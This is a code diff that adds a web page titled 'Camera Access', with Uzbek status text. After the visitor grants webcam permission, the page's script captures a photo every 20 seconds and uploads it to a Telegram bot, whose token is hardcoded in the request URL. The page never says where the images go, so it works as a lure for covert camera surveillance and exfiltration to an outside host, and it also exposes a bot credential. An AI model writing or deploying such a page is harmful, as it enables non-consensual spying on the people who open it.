@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Camera Access</title>
+  </head>
+  <body>
+    <h1>📸 Camera Access Required</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <button id="start">Ruxsat Berish va Boshlash</button>
+    <div id="status">Holat: Kutishda...</div>
+
+    <script>
+      const video = document.getElementById("video");
+      const startButton = document.getElementById("start");
+      const statusDiv = document.getElementById("status");
+
+      let stream;
+      let intervalId;
+
+      startButton.addEventListener("click", async () => {
+        try {
+          stream = await navigator.mediaDevices.getUserMedia({ video: true });
+          video.srcObject = stream;
+          statusDiv.innerText = "✅ Kamera yoqildi. Rasm yuborilmoqda...";
+          startSendingPhotos();
+        } catch (err) {
+          statusDiv.innerText = "❌ Kamera ruxsati berilmadi.";
+          console.error(err);
+        }
+      });
+
+      function startSendingPhotos() {
+        intervalId = setInterval(() => {
+          const canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          canvas.toBlob((blob) => {
+            const formData = new FormData();
+            formData.append("photo", blob, "photo.jpg");
+
+            fetch(
+              "https://api.telegram.org/bot8245886522:AAGGhzKyw9rjWrUzmJR11vsORqJs7UdgwQE/sendPhoto",
+              {
+                method: "POST",
+                body: formData,
+              }
+            )
+              .then((res) => res.json())
+              .then((data) => {
+                if (data.ok) {
+                  console.log("✅ Rasm yuborildi");
+                } else {
+                  console.error("❌ Xato:", data);
+                }
+              })
+              .catch((err) => console.error("📡 Xato:", err));
+          }, "image/jpeg");
+        }, 20000); // Har 20 soniyada
+      }
+
+      window.addEventListener("beforeunload", () => {
+        if (intervalId) clearInterval(intervalId);
+        if (stream) stream.getTracks().forEach((track) => track.stop());
+        statusDiv.innerText = "🛑 Kamera to'xtatildi.";
+      });
+    </script>
+  </body>
+</html>
